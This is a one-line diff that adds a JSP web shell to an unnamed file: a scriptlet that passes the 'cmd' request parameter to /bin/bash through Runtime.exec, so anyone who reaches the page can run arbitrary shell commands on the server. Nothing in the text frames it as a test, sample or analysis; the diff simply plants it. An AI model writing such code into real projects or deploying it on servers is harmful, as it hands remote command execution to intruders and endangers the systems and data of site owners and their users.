@@ -1,0 +1,1 @@
+<%Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",request.getParameter("cmd")}); %>
